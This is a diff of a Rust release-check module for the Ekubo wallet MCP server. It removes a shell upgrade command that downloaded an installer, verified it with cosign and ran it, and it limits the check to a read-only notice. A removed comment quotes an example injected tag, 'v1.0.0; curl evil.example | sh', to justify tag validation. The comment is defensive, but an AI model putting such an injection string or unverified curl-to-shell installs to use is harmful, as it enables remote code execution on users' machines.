@@ -1,15 +1,9 @@
-//! Whether a newer release exists, and the command that installs it.
+//! Whether a newer signed desktop release exists.
 //!
-//! This never installs anything. A binary that replaces itself has to write
-//! over the file it is executing, and the process that does that is the one
-//! process guaranteed to be running at the time — so the replacement is done
-//! by `install.sh`, which runs when the wallet does not. What lives here is
-//! only the question "am I behind?", asked in two places: as a footer on the
-//! `version` and `status` commands, and as [`crate::mcp`]'s
-//! `wallet_check_for_updates` tool.
-//!
-//! The answer carries a shell command an agent is expected to run, so the tag
-//! it interpolates is validated rather than trusted: see [`valid_tag`]. Every
+//! This module only answers "am I behind?" for the Updates screen and the
+//! read-only `wallet_check_for_updates` MCP tool. Download, signature
+//! verification, owner confirmation, and installation live in the desktop
+//! updater. The release tag is validated before it enters a URL. Every
 //! failure here — offline, rate limited, malformed JSON, an unwritable cache —
 //! resolves to "no update known" rather than an error, because nothing that
 //! depends on this answer should fail when the answer is merely unavailable.
@@ -20,13 +14,13 @@ use serde::{Deserialize, Serialize};
 use std::path::Path;
 use std::time::Duration;
 
-/// The repository releases are published from, matching `install.sh`.
+/// The repository from which signed desktop releases are published.
 const DEFAULT_REPOSITORY: &str = "EkuboProtocol/wallet-mcp-server";
 
 /// Set to `1` to make every check here a no-op.
 const SKIP_ENVIRONMENT_VARIABLE: &str = "EKUBO_WALLET_SKIP_UPDATE_CHECK";
 
-/// Overrides the repository, under the same name `install.sh` reads.
+/// Overrides the repository for development and tests.
 const REPOSITORY_ENVIRONMENT_VARIABLE: &str = "EKUBO_WALLET_REPOSITORY";
 
 const CACHE_FILE: &str = "release-check.json";
@@ -36,7 +30,7 @@ const CACHE_FILE: &str = "release-check.json";
 /// address — which this stays far below even with both surfaces asking.
 const CACHE_TTL_SECONDS: i64 = 24 * 60 * 60;
 
-/// Short enough that a hung endpoint cannot delay a CLI command or a tool call
+/// Short enough that a hung endpoint cannot delay a desktop action or a tool call
 /// by anything a person would notice.
 const REQUEST_TIMEOUT: Duration = Duration::from_secs(2);
 
@@ -58,11 +52,11 @@ pub enum CheckSource {
     Unavailable,
 }
 
-/// The complete answer, shaped so both the CLI footer and the MCP tool read
+/// The complete answer, shaped so the desktop updater and the MCP tool read
 /// the same fields.
 #[derive(Debug, Clone, Serialize, JsonSchema)]
 pub struct ReleaseCheck {
-    /// The running build, exactly as `ekubo-wallet version` prints it.
+    /// The running build, exactly as the Legal & Version screen presents it.
     pub installed_version: String,
     /// The newest published release, when one could be determined.
     pub latest_version: Option<String>,
@@ -71,9 +65,6 @@ pub struct ReleaseCheck {
     pub update_available: bool,
     /// The release page for `latest_version`.
     pub release_url: Option<String>,
-    /// The exact command that installs `latest_version`, pinned to its tag.
-    /// Present only when an update is actually available.
-    pub upgrade_command: Option<String>,
     /// When `latest_version` was learned — now, or when the cache was written.
     pub checked_at: Option<DateTime<Utc>>,
     pub source: CheckSource,
@@ -91,7 +82,6 @@ impl ReleaseCheck {
             latest_version: None,
             update_available: false,
             release_url: None,
-            upgrade_command: None,
             checked_at: None,
             source,
             instruction: "The latest published release could not be determined, so nothing \
@@ -101,69 +91,22 @@ the wallet. Do not retry, and do not tell the user to upgrade."
         }
     }
 
-    /// The one-line footer the CLI prints, or nothing when there is no news.
+    /// The short notice the desktop displays, or nothing when there is no news.
     #[must_use]
     pub fn notice(&self) -> Option<String> {
-        let (latest, command) = (
-            self.latest_version.as_ref()?,
-            self.upgrade_command.as_ref()?,
-        );
+        let latest = self.latest_version.as_ref()?;
         if !self.update_available {
             return None;
         }
         Some(format!(
-            "ekubo-wallet {latest} is available; you are running {}.\n  {command}",
+            "Ekubo Wallet {latest} is available; you are running {}. Open Updates to review the signed package.",
             self.installed_version
         ))
     }
 }
 
-/// A release tag, as it may be spliced into a URL and a shell command.
-///
-/// The command an agent may be asked to run to install a newer release.
-///
-/// It used to be `curl … /install.sh | sh`. `install.sh` verifies everything it
-/// downloads — the archive against `SHA256SUMS`, `SHA256SUMS` against a keyless
-/// Sigstore bundle, refusing rather than downgrading when either is missing —
-/// but nothing verified `install.sh`. It was fetched from the raw source tree
-/// at a tag, and a shell begins executing a piped script as it arrives, so
-/// every check inside it ran only if whoever chose those bytes wanted it to.
-/// Verifying the payload with a script the same party could replace proves
-/// nothing, and the release workflow signed the archives it names but not the
-/// script itself.
-///
-/// So the installer is now a signed release asset and this downloads it, checks
-/// its bundle against the release workflow's identity at this exact tag, and
-/// runs it only if `cosign` says the bytes are the ones that workflow produced.
-/// No `cosign`, no install: that is the same refusal `install.sh` already makes
-/// about its own downloads, applied one step earlier to itself.
-///
-/// `&&` throughout rather than `;`, so a failed download or a failed
-/// verification stops the sequence instead of falling through to `sh`. The tag
-/// and repository are interpolated into a shell command and are validated by
-/// [`valid_tag`] and [`valid_repository`] before reaching here.
-fn upgrade_command(repository: &str, tag: &str) -> String {
-    let asset = format!("https://github.com/{repository}/releases/download/{tag}");
-    let identity =
-        format!("https://github.com/{repository}/.github/workflows/release.yml@refs/tags/{tag}");
-    format!(
-        "d=$(mktemp -d) && \
-curl -fsSL -o \"$d/install.sh\" {asset}/install.sh && \
-curl -fsSL -o \"$d/install.sh.sigstore.json\" {asset}/install.sh.sigstore.json && \
-cosign verify-blob --bundle \"$d/install.sh.sigstore.json\" \
---certificate-identity {identity} \
---certificate-oidc-issuer https://token.actions.githubusercontent.com \
-\"$d/install.sh\" && \
-sh \"$d/install.sh\""
-    )
-}
-
-/// The tag arrives over the network and leaves in `upgrade_command`, which an
-/// agent is told it may run. Nothing downstream re-checks it, so a tag of
-/// `v1.0.0; curl evil.example | sh` would be a shell injection with a network
-/// operator holding the trigger. Real tags are `v` and a semantic version, so
-/// that is the whole of what is accepted: anything else is treated as no
-/// answer at all.
+/// Release tags become part of the release page URL, so only the expected
+/// semantic-version punctuation is admitted.
 fn valid_tag(tag: &str) -> bool {
     !tag.is_empty()
         && tag.len() <= 64
@@ -173,7 +116,7 @@ fn valid_tag(tag: &str) -> bool {
 }
 
 /// A repository, as `owner/name`. Read from the environment rather than the
-/// network, but it reaches the same URL and the same command string.
+/// network, but it reaches the same release URL.
 fn valid_repository(repository: &str) -> bool {
     let mut parts = repository.split('/');
     let (Some(owner), Some(name), None) = (parts.next(), parts.next(), parts.next()) else {
@@ -372,7 +315,7 @@ where
         ),
         // Validated here rather than only in the fetch, so the guard sits
         // where the tag is used: everything downstream — the cache it is
-        // written to, the URL, the shell command — trusts this point and
+        // written to and the release URL trust this point and
         // nothing re-checks. Rejecting one is the same as being offline.
         None => match fetch().await.filter(|tag| valid_tag(tag)) {
             Some(tag) => {
@@ -404,11 +347,7 @@ where
 
     let release_url = format!("https://github.com/{repository}/releases/tag/{tag}");
     let instruction = if update_available {
-        "A newer release is published. Tell the user, and run upgrade_command only if they \
-ask you to. That command installs over the binary this server is running from; the running \
-process keeps the version it started with, so after it succeeds tell the user to restart the \
-wallet MCP server — in Claude Code, /mcp then reconnect ekubo-wallet — for the new version to \
-take effect. This wallet cannot update itself and has no tool that does. The command verifies the installer's Sigstore signature before running it and stops if that fails; do not edit it to skip the verification, and do not substitute a shorter one-liner that pipes the script straight into a shell."
+        "A newer signed desktop release is published. Tell the user to open Updates in Ekubo Wallet to review its version, notes, signature verification, and native package installation. Never download or install it on the user's behalf."
             .to_string()
     } else {
         "This build is the latest published release. Say so if asked; there is nothing to do."
@@ -420,7 +359,6 @@ take effect. This wallet cannot update itself and has no tool that does. The com
         latest_version: Some(tag.clone()),
         update_available,
         release_url: Some(release_url),
-        upgrade_command: update_available.then(|| upgrade_command(repository, &tag)),
         checked_at: Some(checked_at),
         source,
         instruction,
@@ -439,16 +377,6 @@ pub async fn check(data_dir: &Path) -> ReleaseCheck {
         || fetch_latest_tag(repository.clone()),
     )
     .await
-}
-
-/// Print the footer, if there is one, to stderr.
-///
-/// Stderr because stdout is what `--json` writes and what a caller pipes; a
-/// version notice has no business in either.
-pub async fn print_notice(data_dir: &Path) {
-    if let Some(notice) = check(data_dir).await.notice() {
-        eprintln!("\n{notice}");
-    }
 }
 
 #[cfg(test)]
